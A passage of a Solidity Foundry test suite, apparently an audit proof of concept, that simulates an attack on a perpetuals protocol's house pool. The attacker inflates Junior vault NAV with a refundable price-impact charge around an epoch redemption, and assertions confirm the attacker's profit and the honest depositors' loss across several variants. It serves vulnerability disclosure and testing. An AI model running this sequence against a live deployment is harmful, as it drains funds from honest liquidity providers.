        assertApproxEqAbs(
            atk.juniorTotalAfterOpen, atk.juniorTotalBeforeOpen + atk.vpiCharged, 2e6, "V counted as Junior NAV at once"
        );
        assertGt(-atk.rawCloseVpi, int256(atk.vpiCharged), "raw close rebate exceeds V: lifetime clamp binds");
        assertEq(atk.rebateWaived, 0, "rebate not waived: free pool cash >> V");
        assertEq(atk.rebatePaid, atk.rebateAssessed, "rebate paid in full");
        assertEq(atk.rebateAssessed + atk.feeClose, atk.vpiCharged, "lifetime clamp: rebate = V - closeFee");
        uint256 attackerCredit = atk.attackerChAfterClose - atk.attackerChBeforeClose;
        assertEq(atk.poolBeforeClose - atk.poolAfterClose, attackerCredit, "pool cash pays the attacker");
        uint256 carry = atk.rebatePaid - attackerCredit; // carry realized at close, netted against the payout
        assertLt(carry, 20e6, "carry for a ~3 minute hold is negligible");

        // --- harm checks (attack minus control, identical clock)
        uint256 fWad = (atk.attackerShares * 1e18) / atk.juniorSupply; // attacker Junior fraction
        uint256 fV = (fWad * atk.vpiCharged) / 1e18;
        uint256 redemptionUplift = atk.attackerFunded - ctl.attackerFunded;
        emit log_string("== HARM (attack - control) ==");
        emit log_named_decimal_uint("  attacker Junior fraction f (1e18)", fWad, 18);
        emit log_named_decimal_uint("  f * V", fV, 6);
        emit log_named_decimal_uint("  redemption uplift vs control", redemptionUplift, 6);
        assertApproxEqAbs(redemptionUplift, fV, 2e6, "redemption is inflated by f*V");

        int256 attackerGain = (int256(atk.attackerEnd) - int256(atk.attackerStart))
            - (int256(ctl.attackerEnd) - int256(ctl.attackerStart));
        int256 expectedGain = int256(fV) - int256(atk.feeOpen) - int256(atk.feeClose) - int256(carry);
        emit log_named_decimal_int("  attacker net gain vs control", attackerGain, 6);
        emit log_named_decimal_int("  expected f*V - openFee - closeFee - carry", expectedGain, 6);
        assertGt(attackerGain, 0, "attacker nets a profit");
        assertApproxEqAbs(attackerGain, expectedGain, 3e6, "attacker gain = f*V - fees - carry");

        int256 victimLoss = int256(ctl.victimEnd) - int256(atk.victimEnd);
        uint256 victimFracWad = (atk.victimShares * 1e18) / (atk.juniorSupply - atk.attackerShares);
        int256 expectedLoss = int256((victimFracWad * (fV - atk.feeClose - carry)) / 1e18);
        emit log_named_decimal_int("  victim Junior loss vs control", victimLoss, 6);
        emit log_named_decimal_int("  expected victimShare * (f*V - closeFee - carry)", expectedLoss, 6);
        emit log_named_decimal_uint("  treasury gain vs control (open fee)", (atk.treasuryEnd - atk.treasuryStart) - (ctl.treasuryEnd - ctl.treasuryStart), 6);
        assertGt(victimLoss, 0, "victim co-Junior bears the refund");
        assertApproxEqAbs(victimLoss, expectedLoss, 3e6, "victim loss = share of (f*V - closeFee - carry)");
        assertApproxEqAbs(atk.seniorEnd - atk.seniorStart, ctl.seniorEnd - ctl.seniorStart, 1e6, "Senior unaffected");
    }

    /// @notice From one snapshot, compare actual USDG paid to an honest Junior depositor redeeming the same
    ///         fully funded share tranche in a later epoch. Her unredeemed shares and the Senior coupon are tracked.
    function test_Attack_VictimClaimsLessUsdgOnLaterFundedRedemption() public {
        uint256 snap = vm.snapshotState();
        Cycle memory ctl = _runCycle(false, 0);
        uint256 fixedShares = ctl.victimShares / 4;
        assertGt(fixedShares, 0, "nonzero fixed victim tranche");
        VictimExit memory controlExit = _redeemVictimTranche(fixedShares);
        vm.revertToState(snap);

        Cycle memory atk = _runCycle(true, 0);
        assertEq(atk.victimShares, ctl.victimShares, "same deposited shares in both branches");
        VictimExit memory attackExit = _redeemVictimTranche(fixedShares);

        assertEq(attackExit.maturity, controlExit.maturity, "redemptions settle at the same time");
        assertEq(attackExit.claimedShares, controlExit.claimedShares, "same fully funded share tranche");
        assertEq(attackExit.walletBefore, controlExit.walletBefore, "same initial victim USDG wallet");
        assertEq(attackExit.residualShares, controlExit.residualShares, "same shares remain with victim");
        assertEq(attackExit.residualShares, ctl.victimShares - fixedShares, "residual shares accounted for");
        assertApproxEqAbs(
            attackExit.seniorAssetsAtClaim - atk.seniorStart,
            controlExit.seniorAssetsAtClaim - ctl.seniorStart,
            1e6,
            "same Senior coupon over the matched epochs"
        );

        uint256 realizedLoss = controlExit.paidAssets - attackExit.paidAssets;
        uint256 residualLoss = controlExit.residualValue - attackExit.residualValue;
        uint256 totalVictimLoss = (controlExit.walletAfter + controlExit.residualValue)
            - (attackExit.walletAfter + attackExit.residualValue);
        emit log_string("== ACTUAL VICTIM USDG CLAIM (same snapshot, later epoch) ==");
        emit log_named_decimal_uint("  fixed Junior shares claimed", fixedShares, 18);
        emit log_named_decimal_uint("  no-trade victim USDG received", controlExit.paidAssets, 6);
        emit log_named_decimal_uint("  attack victim USDG received", attackExit.paidAssets, 6);
        emit log_named_decimal_uint("  realized USDG shortfall on claimed tranche", realizedLoss, 6);
        emit log_named_decimal_uint("  residual Junior shares in each branch", attackExit.residualShares, 18);
        emit log_named_decimal_uint("  no-trade residual Junior value", controlExit.residualValue, 6);
        emit log_named_decimal_uint("  attack residual Junior value", attackExit.residualValue, 6);
        emit log_named_decimal_uint("  total victim wallet plus residual-share loss", totalVictimLoss, 6);
        emit log_named_decimal_uint("  no-trade Senior coupon through claim", controlExit.seniorAssetsAtClaim - ctl.seniorStart, 6);
        emit log_named_decimal_uint("  attack Senior coupon through claim", attackExit.seniorAssetsAtClaim - atk.seniorStart, 6);
        assertGt(realizedLoss, 0, "honest victim receives fewer deposited USDG tokens after attack");
        assertLt(attackExit.residualValue, controlExit.residualValue, "remaining shares also bear loss");
        assertEq(totalVictimLoss, realizedLoss + residualLoss, "claimed and remaining shares explain victim loss");
        assertApproxEqAbs(totalVictimLoss, ctl.victimEnd - atk.victimEnd, 1e6, "later coupon preserves loss");
    }

    /// @notice Same attack with Pyth confidence at the release ceiling (10 bps) so the 25% adverse execution shift
    ///         (2.5 bps per leg) applies to both legs. Reports whether the cycle is still profitable.
    function test_Attack_AtMaxConfidence() public {
        uint256 snap = vm.snapshotState();
        Cycle memory ctl = _runCycle(false, 0);
        vm.revertToState(snap);
        Cycle memory atk = _runCycle(true, MAX_CONF);
        _logCycle("== ATTACK at max confidence (10 bps conf, 2.5 bps adverse shift per leg) ==", atk);
        _logTrade(atk);
        int256 attackerGain = (int256(atk.attackerEnd) - int256(atk.attackerStart))
            - (int256(ctl.attackerEnd) - int256(ctl.attackerStart));
        int256 victimLoss = int256(ctl.victimEnd) - int256(atk.victimEnd);
        emit log_named_decimal_int("  attacker net gain vs control", attackerGain, 6);
        emit log_named_decimal_int("  victim Junior change vs control (+ = loss)", victimLoss, 6);
        assertEq(atk.rebatePaid, atk.rebateAssessed, "rebate paid in full");
    }

}

/// @notice PART 2 — variants of the attack in RefundableVpiNavExtractionTest above.
///         (A) passive: an unrelated trader's skew-cap position spans an epoch while an honest Junior redeems;
///         (B) attacker holds only 30% of Junior;
///         (C1) tranche mix Senior 60% / Junior 40%, attacker at the covenant-max share of the existing Junior;
///         (C2) honest pool Senior 60% / Junior 40%, attacker supplies its own (uncapped) Junior capital;
///         (D) rebate size with no redemption at all (separates the finding from SCAN-31 depth manipulation);
///         (E) cycle timing: deposit -> earliest funded redemption.
contract RefundableVpiVariantsTest is BasePerpTest {

    address internal constant ATTACKER = address(0xA77AC4);
    address internal constant VICTIM = address(0x71C7144);
    address internal constant REDEEMER = address(0x2EDEE3); // honest Junior that redeems (passive variant)
    address internal constant TRADER = address(0x7EADE2); // unrelated trader (passive variant)
    address internal constant SAM = address(0x5A11); // Senior LP

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant VPI_FACTOR = 0.01e18;
    uint64 internal constant MAX_CONF = 100_000;

    bytes32 internal constant ACTION_REBATE_SETTLED = keccak256("ActionRebateSettled(address,uint256,uint256,uint256)");

    struct Scn {
        address trader;
        address redeemer;
        address victim;
        bool trade;
        bool redeem;
        uint64 conf;
    }

    struct Res {
        uint256 traderStart;
        uint256 traderEnd;
        uint256 redeemerStart;
        uint256 redeemerEnd;
        uint256 victimStart;
        uint256 victimEnd;
        uint256 redeemerShares;
        uint256 juniorSupply;
        uint256 funded;
        uint256 maxJuniorWithdrawBeforeSettle;
        uint256 depthAtOpen;
        uint256 notional;
        uint256 vpi;
        uint256 feeOpen;
        uint256 rebateAssessed;
        uint256 rebatePaid;
        uint256 rebateWaived;
        int256 rawCloseVpi;
        uint256 treasuryStart;
        uint256 treasuryEnd;
        uint256 seniorStart;
        uint256 seniorEnd;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: VPI_FACTOR,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        routerAdmin.proposeRouterConfig(config);
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        uint256 activation = vm.getBlockTimestamp() + 72 hours + 1;
        if (pool.poolConfigActivationTime() > activation) {
            activation = pool.poolConfigActivationTime();
        }
        vm.warp(activation);
        routerAdmin.finalizeRouterConfig();
        pool.finalizePoolConfig();
        assertFalse(engine.isOracleFrozen(), "weekday setup");
    }

    // ------------------------------------------------------------------ setup helpers

    function _seed(
        address j1,
        uint256 a1,
        address j2,
        uint256 a2,
        uint256 seniorAssets,
        address trader,
        uint256 traderDeposit
    ) internal {
        _fundJunior(j1, a1);
        _fundJunior(j2, a2);
        _fundSenior(SAM, seniorAssets);
        uint256 unlock = juniorVault.lastDepositTime(j1) + juniorVault.DEPOSIT_COOLDOWN();
        uint256 unlock2 = juniorVault.lastDepositTime(j2) + juniorVault.DEPOSIT_COOLDOWN();
        if (unlock2 > unlock) {
            unlock = unlock2;
        }
        if (vm.getBlockTimestamp() < unlock) {
            vm.warp(unlock + 1);
        }
        _fundTrader(trader, traderDeposit);
        _refreshMark(PRICE);
        assertFalse(engine.isOracleFrozen(), "still a weekday");
    }

    // ------------------------------------------------------------------ oracle helpers (copied from the PoC)

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
        router.updateMarkPrice(_livePriceData(price));
    }

    function _settleEpoch(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
        bytes[] memory data = _livePriceData(price);
        try router.settleLpEpoch(data) {}
        catch (bytes memory err) {
            if (_sideOpenInterest(CfdTypes.Side.LONG) + _sideOpenInterest(CfdTypes.Side.SHORT) != 0) {
                assembly ("memory-safe") {
                    revert(add(err, 32), mload(err))
                }
            }
            pool.settleLpEpoch(0, 0);
        }
    }

    function _execData(
        uint256 price,
        uint64 conf
    ) internal returns (bytes[] memory data) {
        data = _mockPythUpdateData(price);
        if (conf != 0) {
            uint256 publishTime = _mockHistoricalPublishTime();
            baseMockPyth.setAllUniquePrices(
                _basePythFeedIds(),
                int64(uint64(price)),
                conf,
                int32(-8),
                publishTime,
                publishTime == 0 ? 0 : publishTime - 1
            );
        }
    }

    function _exec(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price,
        uint64 conf
    ) internal returns (OrderV3Types.ExecutionResult memory r) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 id = router.commitOrder(request);
        bytes[] memory data = _execData(price, conf);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(trader);
        r = router.executeOrder(id, data);
    }

    function _previewCode(
        address trader,
        uint256 lots,
        uint256 margin
    ) internal view returns (uint8) {
        try engineLens.previewOpenRevertCode(
            trader, CfdTypes.Side.LONG, lots * CfdTypes.SIZE_QUANTUM, margin, PRICE
        ) returns (uint8 code) {
            return code;
        } catch {
            return type(uint8).max;
        }
    }

    function _maxAdmissibleLots(
        address trader,
        uint256 margin
    ) internal view returns (uint256) {
        uint256 lo;
        uint256 hi = 400_000;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            if (_previewCode(trader, mid, margin) == 0) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        return lo;
    }

    function _juniorValue(
        address lp
    ) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(lp));
    }

    function _wealth(
        address a
    ) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a) + settlementToken.balanceOf(a) + _juniorValue(a);
    }

    function _economicDepth() internal view returns (uint256) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return p > c ? p - c : 0;
    }

    // ------------------------------------------------------------------ generic cycle

    function _open(
        Scn memory s,
        Res memory r
    ) internal {
        r.depthAtOpen = _economicDepth();
        uint256 margin = (r.depthAtOpen * 4) / 1000; // 1% of the ~0.4 D notional, refundable
        uint256 lots = _maxAdmissibleLots(s.trader, margin);
        assertEq(_previewCode(s.trader, lots + 1, margin), 4, "skew cap binds");
        r.notional = lots * PRICE;
        uint256 tBefore = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        OrderV3Types.ExecutionResult memory x =
            _exec(s.trader, CfdTypes.Side.LONG, lots * CfdTypes.SIZE_QUANTUM, margin, false, PRICE, s.conf);
        assertEq(uint8(x.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executed");
        int256 vpi;
        (,,,,,, vpi) = engine.positions(s.trader);
        assertGt(vpi, 0, "positive VPI paid");
        r.vpi = uint256(vpi);
        r.feeOpen = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT) - tBefore;
    }

    function _close(
        Scn memory s,
        Res memory r
    ) internal {
        (uint256 size,,,,,,) = engine.positions(s.trader);
        r.rawCloseVpi = CfdMath.calculateVPI((size * PRICE) / 1e20, 0, _economicDepth(), VPI_FACTOR);
        vm.recordLogs();
        OrderV3Types.ExecutionResult memory x = _exec(s.trader, CfdTypes.Side.LONG, size, 0, true, PRICE, s.conf);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        assertEq(uint8(x.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close executed");
        (uint256 after_,,,,,,) = engine.positions(s.trader);
        assertEq(after_, 0, "flat");
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].topics.length == 2 && logs[i].topics[0] == ACTION_REBATE_SETTLED
                    && address(uint160(uint256(logs[i].topics[1]))) == s.trader
            ) {
                (r.rebateAssessed, r.rebatePaid, r.rebateWaived) = abi.decode(logs[i].data, (uint256, uint256, uint256));
            }
        }
    }

    function _idle() internal {
        vm.roll(vm.getBlockNumber() + 2);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _run(
        Scn memory s
    ) internal returns (Res memory r) {
        uint256 epochStart = pool.lpEpochStart(pool.currentLpEpoch() + 1);
        vm.warp(epochStart + 60);
        _refreshMark(PRICE);
        r.traderStart = _wealth(s.trader);
        r.redeemerStart = _wealth(s.redeemer);
        r.victimStart = _juniorValue(s.victim);
        r.treasuryStart = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        r.seniorStart = seniorVault.totalAssets();
        r.juniorSupply = juniorVault.accruedTotalSupply();
        r.redeemerShares = juniorVault.balanceOf(s.redeemer);

        uint256 maturity = epochStart + 1 hours;
        if (s.redeem) {
            vm.prank(s.redeemer);
            uint256 reqId = juniorVault.requestRedeem(r.redeemerShares, s.redeemer, s.redeemer);
            assertEq(pool.lpEpochStart(reqId), maturity, "request targets the imminent epoch");
        }

        vm.warp(maturity - 120);
        _refreshMark(PRICE);
        if (s.trade) {
            _open(s, r);
        } else {
            _idle();
        }
        _refreshMark(PRICE);

        vm.warp(maturity);
        if (s.redeem) {
            // With no LP request queued the epoch has no work (settlement reverts NoLpEpochProgress); NAV is read via
            // the vault's pending-reconcile preview instead.
            _settleEpoch(PRICE);
        }
        if (s.redeem) {
            r.funded = juniorVault.maxWithdraw(s.redeemer);
            assertEq(juniorVault.maxRedeem(s.redeemer), r.redeemerShares, "redemption fully funded");
            vm.prank(s.redeemer);
            juniorVault.withdraw(r.funded, s.redeemer, s.redeemer);
        }
        if (s.trade) {
            _close(s, r);
        } else {
            _idle();
        }
        _refreshMark(PRICE);
        r.traderEnd = _wealth(s.trader);
        r.redeemerEnd = _wealth(s.redeemer);
        r.victimEnd = _juniorValue(s.victim);
        r.treasuryEnd = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        r.seniorEnd = seniorVault.totalAssets();
    }

    function _d(
        uint256 aEnd,
        uint256 aStart,
        uint256 bEnd,
        uint256 bStart
    ) internal pure returns (int256) {
        return (int256(aEnd) - int256(aStart)) - (int256(bEnd) - int256(bStart));
    }

    function _logTrade(
        Res memory r
    ) internal {
        emit log_named_decimal_uint("  depth at open D", r.depthAtOpen, 6);
        emit log_named_decimal_uint("  notional N", r.notional, 6);
        emit log_named_decimal_uint("  VPI V", r.vpi, 6);
        emit log_named_decimal_uint("  open fee", r.feeOpen, 6);
        emit log_named_decimal_int("  raw close VPI (pre-clamp)", r.rawCloseVpi, 6);
        emit log_named_decimal_uint("  rebate assessed", r.rebateAssessed, 6);
        emit log_named_decimal_uint("  rebate paid", r.rebatePaid, 6);
        emit log_named_decimal_uint("  rebate waived", r.rebateWaived, 6);
    }

    /// @dev Runs control (no trade) and attack (trade) from one snapshot with trader == redeemer == ATTACKER.
    function _attackVsControl(
        string memory tag,
        uint64 conf
    ) internal returns (int256 gain, int256 victimLoss, Res memory atk) {
        Scn memory s = Scn(ATTACKER, ATTACKER, VICTIM, false, true, conf);
        uint256 snap = vm.snapshotState();
        Res memory ctl = _run(s);
        vm.revertToState(snap);
        s.trade = true;
        atk = _run(s);
        gain = _d(atk.redeemerEnd, atk.redeemerStart, ctl.redeemerEnd, ctl.redeemerStart);
        victimLoss = _d(ctl.victimEnd, ctl.victimStart, atk.victimEnd, atk.victimStart);
        uint256 fWad = (atk.redeemerShares * 1e18) / atk.juniorSupply;
        emit log_string(tag);
        _logTrade(atk);
        emit log_named_decimal_uint("  attacker Junior fraction f", fWad, 18);
        emit log_named_decimal_uint("  redemption funded (attack)", atk.funded, 6);
        emit log_named_decimal_uint("  redemption funded (control)", ctl.funded, 6);
        emit log_named_decimal_uint("  victim Junior value at start", atk.victimStart, 6);
        emit log_named_decimal_int("  attacker net gain vs control", gain, 6);
        emit log_named_decimal_int("  victim loss vs control (+ = loss)", victimLoss, 6);
        emit log_named_decimal_int(
            "  victim loss in ppm of victim value", (victimLoss * 1e6) / int256(atk.victimStart), 0
        );
        emit log_named_decimal_int(
            "  Senior delta attack - control", _d(atk.seniorEnd, atk.seniorStart, ctl.seniorEnd, ctl.seniorStart), 6
        );
    }

    // ------------------------------------------------------------------ (A) passive variant

    /// @notice Unrelated trader opens at the skew cap two minutes before the epoch; an honest Junior (60%) redeems at
    ///         that epoch; the trader closes right after. Compared with (i) no trade and (ii) trade but no redemption.
    function test_A_Passive_HonestRedeemerOverpaid() public {
        _seed(REDEEMER, 3_600_000e6, VICTIM, 2_400_000e6, 4_000_000e6, TRADER, 100_000e6);
        uint256 snap = vm.snapshotState();
        Res memory ctl = _run(Scn(TRADER, REDEEMER, VICTIM, false, true, 0));
        vm.revertToState(snap);
        Res memory noRed = _run(Scn(TRADER, REDEEMER, VICTIM, true, false, 0));
        vm.revertToState(snap);
        Res memory pas = _run(Scn(TRADER, REDEEMER, VICTIM, true, true, 0));

        emit log_string("== (A) passive: unrelated trader + honest redeemer ==");
        _logTrade(pas);
        int256 redeemerGainVsNoTrade = _d(pas.redeemerEnd, pas.redeemerStart, ctl.redeemerEnd, ctl.redeemerStart);
        int256 victimLossVsNoTrade = _d(ctl.victimEnd, ctl.victimStart, pas.victimEnd, pas.victimStart);
        int256 redeemerGainVsNoRedeem =
            _d(pas.redeemerEnd, pas.redeemerStart, noRed.redeemerEnd, noRed.redeemerStart);
        int256 victimLossVsNoRedeem = _d(noRed.victimEnd, noRed.victimStart, pas.victimEnd, pas.victimStart);
        int256 traderNet = int256(pas.traderEnd) - int256(pas.traderStart);
        emit log_named_decimal_uint("  redemption funded (trade)", pas.funded, 6);
        emit log_named_decimal_uint("  redemption funded (no trade)", ctl.funded, 6);
        emit log_named_decimal_int("  honest redeemer gain vs no-trade control", redeemerGainVsNoTrade, 6);
        emit log_named_decimal_int("  remaining Junior loss vs no-trade control", victimLossVsNoTrade, 6);
        emit log_named_decimal_int("  honest redeemer gain vs trade-but-no-redemption", redeemerGainVsNoRedeem, 6);
        emit log_named_decimal_int("  remaining Junior loss vs trade-but-no-redemption", victimLossVsNoRedeem, 6);
        emit log_named_decimal_int("  trader net (fees + carry)", traderNet, 6);
        assertGt(pas.funded, ctl.funded, "honest redeemer is paid part of the refundable V");
        assertGt(victimLossVsNoTrade, 0, "remaining Junior worse off than with no trade");
        assertGt(victimLossVsNoRedeem, 0, "remaining Junior pays the redeemer's share of the refund");
        assertLt(traderNet, 0, "trader alone does not profit");
    }

    // ------------------------------------------------------------------ (B) smaller attacker share

    function test_B_Attacker30pct_SignOfNet() public {
        _seed(ATTACKER, 1_800_000e6, VICTIM, 4_200_000e6, 4_000_000e6, ATTACKER, 100_000e6);
        (int256 gain, int256 victimLoss,) = _attackVsControl("== (B) attacker 30% of Junior ==", 0);
        assertLt(gain, 0, "below f ~ 0.4 the cycle loses money for the attacker");
        assertGt(victimLoss, 0, "victim still loses (griefing at a cost)");
    }

    // ------------------------------------------------------------------ (C1) S60/J40, covenant-max share of existing Junior

    function test_C1_Mix60_40_CovenantMaxShare() public {
        // Senior 6M, Junior 4M. Covenant: Junior after redemption >= 25% of Senior = 1.5M -> f_max ~ 0.625.
        _seed(ATTACKER, 2_490_000e6, VICTIM, 1_510_000e6, 6_000_000e6, ATTACKER, 100_000e6);
        emit log_named_decimal_uint("  getMaxJuniorWithdraw at start", pool.getMaxJuniorWithdraw(), 6);
        (int256 gain, int256 victimLoss,) = _attackVsControl("== (C1) S 6M / J 4M, attacker 2.49M of J ==", 0);
        assertGt(gain, 0, "profitable at the covenant-max share");
        assertGt(victimLoss, 0, "victim loses");
    }

    function test_C1b_Mix60_40_AboveCovenantRedemptionNotFullyFunded() public {
        // Attacker 2.6M of 4M Junior: full redemption would leave 1.4M < 1.5M covenant floor.
        _seed(ATTACKER, 2_600_000e6, VICTIM, 1_400_000e6, 6_000_000e6, ATTACKER, 100_000e6);
        uint256 epochStart = pool.lpEpochStart(pool.currentLpEpoch() + 1);
        vm.warp(epochStart + 60);
        _refreshMark(PRICE);
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        vm.warp(epochStart + 1 hours);
        _settleEpoch(PRICE);
        emit log_named_decimal_uint("  covenant-capped: shares redeemed / requested (1e18)", (juniorVault.maxRedeem(ATTACKER) * 1e18) / shares, 18);
        assertLt(juniorVault.maxRedeem(ATTACKER), shares, "covenant caps the redemption above f ~ 0.625");
    }

    // ------------------------------------------------------------------ (C2) attacker supplies its own Junior capital

    function test_C2_HonestPool60_40_AttackerSuppliesCapital() public {
        // Honest pool: Senior 6M, honest Junior 4M. Attacker deposits 14M Junior (uncapped; requestDeposit max = uint max).
        _seed(VICTIM, 4_000_000e6, ATTACKER, 14_000_000e6, 6_000_000e6, ATTACKER, 400_000e6);
        (int256 gain, int256 victimLoss,) =
            _attackVsControl("== (C2) honest S 6M / J 4M, attacker brings 14M Junior ==", 0);
        assertGt(gain, 0, "profitable");
        assertGt(victimLoss, 0, "honest Junior loses");
    }

    function test_C2_AtMaxConfidence() public {
        _seed(VICTIM, 4_000_000e6, ATTACKER, 14_000_000e6, 6_000_000e6, ATTACKER, 400_000e6);
        (int256 gain, int256 victimLoss,) =
            _attackVsControl("== (C2) at 10 bps Pyth confidence (2.5 bps shift/leg) ==", MAX_CONF);
        assertGt(gain, 0, "still profitable at the confidence ceiling");
        assertGt(victimLoss, 0, "honest Junior loses");
    }

    // ------------------------------------------------------------------ (D) rebate does not need the depth drop

    function test_D_RebateWithoutRedemptionEqualsAttackRebate() public {
        _seed(ATTACKER, 3_600_000e6, VICTIM, 2_400_000e6, 4_000_000e6, ATTACKER, 100_000e6);
        uint256 snap = vm.snapshotState();
        Res memory noRed = _run(Scn(ATTACKER, ATTACKER, VICTIM, true, false, 0));
        vm.revertToState(snap);
        Res memory atk = _run(Scn(ATTACKER, ATTACKER, VICTIM, true, true, 0));
        emit log_string("== (D) close rebate with vs without the depth-reducing redemption ==");
        emit log_named_decimal_uint("  V", atk.vpi, 6);
        emit log_named_decimal_int("  raw close VPI, no redemption (depth ~ D + V)", noRed.rawCloseVpi, 6);
        emit log_named_decimal_uint("  rebate assessed, no redemption", noRed.rebateAssessed, 6);
        emit log_named_decimal_int("  raw close VPI, with redemption", atk.rawCloseVpi, 6);
        emit log_named_decimal_uint("  rebate assessed, with redemption (clamped)", atk.rebateAssessed, 6);
        emit log_named_decimal_uint("  difference", atk.rebateAssessed - noRed.rebateAssessed, 6);
        int256 trapNoRedeem = int256(noRed.traderEnd) - int256(noRed.traderStart);
        emit log_named_decimal_int("  attacker wealth delta trading without redeeming", trapNoRedeem, 6);
        assertApproxEqRel(noRed.rebateAssessed, atk.rebateAssessed, 0.002e18, "depth drop adds < 0.2% to the rebate");
    }

    // ------------------------------------------------------------------ (E) cycle timing

    function test_E_CycleTiming_DepositToFundedRedemption() public {
        _seed(VICTIM, 4_000_000e6, SAM, 1_000_000e6, 1_000_000e6, TRADER, 10_000e6);
        address capital = address(0xCAB1);
        uint256 amt = 1_000_000e6;
        settlementToken.mint(capital, amt);
        uint256 e0 = pool.lpEpochStart(pool.currentLpEpoch() + 1);
        vm.warp(e0 + 60);
        _refreshMark(PRICE);
        vm.startPrank(capital);
        settlementToken.approve(address(juniorVault), amt);
        uint256 depId = juniorVault.requestDeposit(amt, capital, capital);
        vm.stopPrank();
        uint256 act = pool.lpEpochStart(depId);
        emit log_named_uint("  deposit requested at (s from e0)", 60);
        emit log_named_uint("  deposit activates at (s from e0)", act - e0);
        vm.warp(act);
        _settleEpoch(PRICE);
        uint256 claimable = juniorVault.claimableDepositRequest(depId, capital);
        vm.prank(capital);
        juniorVault.claimDeposit(depId, claimable, capital, capital);
        uint256 shares = juniorVault.balanceOf(capital);
        // Just before the cooldown ends the request reverts.
        vm.warp(act + 1 hours - 30);
        _refreshMark(PRICE);
        vm.prank(capital);
        vm.expectRevert();
        juniorVault.requestRedeem(shares, capital, capital);
        vm.warp(act + 1 hours + 1);
        _refreshMark(PRICE);
        vm.prank(capital);
        uint256 redId = juniorVault.requestRedeem(shares, capital, capital);
        uint256 funded = pool.lpEpochStart(redId);
        emit log_named_uint("  earliest redemption funding (s from e0)", funded - e0);
        emit log_named_uint("  hours from deposit request to funded redemption (approx)", (funded - e0) / 1 hours);
        assertEq(funded, e0 + 3 hours, "one cycle per capital set every 3 epochs");
    }

}

```
